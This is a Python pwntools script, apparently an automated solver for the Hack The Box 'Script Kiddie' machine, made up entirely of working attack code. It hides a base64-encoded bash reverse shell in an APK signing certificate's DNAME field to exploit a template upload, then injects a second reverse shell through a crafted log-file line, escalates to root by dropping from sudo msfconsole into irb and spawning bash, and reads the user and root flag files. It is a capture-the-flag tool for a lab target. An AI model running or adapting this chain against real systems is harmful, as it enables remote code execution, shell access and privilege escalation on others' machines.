from pwn import *
import threading
from pathlib import Path
import subprocess
import requests
import base64
import os
import sys
Box_IP=sys.argv[1]
Local_Host=sys.argv[2]

def Evil_APK_Upload():
    Payload=f"/bin/bash -c \"/bin/bash -i >& /dev/tcp/{Local_Host}/1337 0>&1\""
    Encoded_Payload=base64.b64encode(bytes(Payload,"utf-8")).decode('utf-8').replace('\n','')
    DNAME=f"CN='|echo {Encoded_Payload} | base64 -d | sh #"
    Path('emptyfile').touch()
    os.system('zip -j exploit.apk emptyfile > /dev/null')
    subprocess.run(['keytool', '-genkey','-keystore','signing.keystore','-alias','signing.key','-storepass','password','-keypass','password','-keyalg','RSA','-keysize','2048', '-dname',DNAME],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    subprocess.run(['jarsigner','-sigalg','SHA1withRSA','-digestalg','SHA1','-keystore','signing.keystore','-storepass','password','-keypass','password','exploit.apk','signing.key'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    requests.post(f'http://{Box_IP}:5000/',files={'template':open('exploit.apk','rb')}, data={'lhost':Local_Host,'os':'android','name':'template','action':'generate'})

def Lateral_Movement():
    Listen=listen(1338)
    Shell = Listen.wait_for_connection()
    Shell.recvuntil(b'~$')
    Shell.send(b'sudo msfconsole -q\n')
    Shell.recv(2048)
    Shell.send(b'irb\n')
    Shell.recvuntil(b'object')
    Shell.send(b'system("/bin/bash")\n')
    Shell.recvuntil(b'>> system("/bin/bash")\n')
    Shell.send(b'cat /home/kid/user.txt && echo complete\n')
    User_Shell=Shell.recvuntil(b'complete').replace(b'\ncomplete',b'').decode('utf-8').strip()
    Shell.send(b'cat /root/root.txt && echo complete\n')
    Root_Shell=Shell.recvuntil(b'complete').replace(b'\ncomplete',b'').decode('utf-8').strip()
    print(f"User: {User_Shell}")
    print(f"Root: {Root_Shell}")
    Listen.close()


def Inital_Access():
    Listen=listen(1337)
    Shell = Listen.wait_for_connection()
    Shell.recvuntil(b'$')
    Shell.send(bytes(f"echo 'a b $(bash -c \"bash -i &>/dev/tcp/{Local_Host}/1338 0>&1\")' > /home/kid/logs/hackers\n",'utf-8'))
    Shell.recvuntil(b'$')
    Listen.close()

if __name__ =="__main__":
    print('HTB Script Kiddie Auto PWN')
    print('Just wait until completion and will print out flags')
    Evil_APK_Thread=threading.Thread(target=Evil_APK_Upload)
    Inital_Access_Thread = threading.Thread(target=Inital_Access)
    PrivEsc_Thread = threading.Thread(target=Lateral_Movement)
    Evil_APK_Thread.start()
    PrivEsc_Thread.start()
    Inital_Access_Thread.start()
    Evil_APK_Thread.join()
    PrivEsc_Thread.join()
    Inital_Access_Thread.join()
# DrGecko 2024